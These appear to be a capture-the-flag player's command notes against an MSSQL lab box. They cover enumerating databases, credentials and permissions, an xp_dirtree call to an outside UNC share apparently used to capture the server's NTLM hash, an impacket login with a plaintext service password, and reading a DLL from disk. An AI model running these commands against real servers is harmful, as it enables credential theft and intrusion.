
SELECT name FROM sys.databases;
USE overwatch;
SELECT name FROM sys.tables;
SELECT * FROM sys.credentials;
SELECT * FROM msdb.dbo.sysproxies;
EXEC xp_dirtree '\\10.10.14.15\share'
SELECT HAS_PERMS_BY_NAME('master..xp_dirtree','OBJECT','EXECUTE') AS can_dirtree, HAS_PERMS_BY_NAME('master..xp_fileexist','OBJECT','EXECUTE') AS can_fileexist;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
xp_dirtree C:\inetpub\wwwroot\

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb' \
  -windows-auth -port 6520
SELECT * FROM OPENROWSET( BULK 'C:\inetpub\hassrv.dll', SINGLE_BLOB ) AS x;